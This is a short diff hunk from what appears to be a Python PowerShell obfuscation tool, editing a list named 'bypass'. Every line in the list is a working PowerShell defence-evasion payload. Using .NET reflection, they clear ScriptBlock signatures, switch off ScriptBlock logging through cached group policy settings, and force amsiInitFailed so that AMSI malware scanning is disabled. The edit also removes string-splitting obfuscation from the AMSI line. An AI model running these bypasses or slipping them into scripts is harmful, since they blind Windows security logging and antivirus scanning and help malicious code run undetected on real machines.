@@ -23,9 +23,9 @@ O_DEBUG_PATH = './debug_obfu/'
 bypass = [
     """[Ref].Assembly.GetType("Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
     """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
-    """try{$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
+    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
-    """[Ref].Assembly.GetType('Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)"""
+    """[Ref].Assembly.GetType('Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
     ]
 
 def get_cmdlets():
